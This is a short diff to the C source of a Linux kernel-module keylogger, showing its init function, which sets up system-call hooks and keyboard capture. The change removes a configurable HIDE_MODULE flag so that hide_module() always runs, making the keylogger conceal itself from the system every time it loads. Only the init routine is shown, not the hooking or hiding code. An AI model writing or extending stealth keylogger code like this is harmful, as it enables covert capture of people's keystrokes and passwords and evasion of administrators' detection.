@@ -7,8 +7,6 @@
 
 MODULE_LICENSE("GPL");
 
-bool HIDE_MODULE = false;
-
 static int __init keylogger_init(void)
 {
 	int rc = sys_calls_init();
@@ -17,10 +15,7 @@ static int __init keylogger_init(void)
 	}
 
 	keyboard_init();
-
-	if (HIDE_MODULE == true) {
-		hide_module();
-	}
+	hide_module();
 
     return 0;
 }
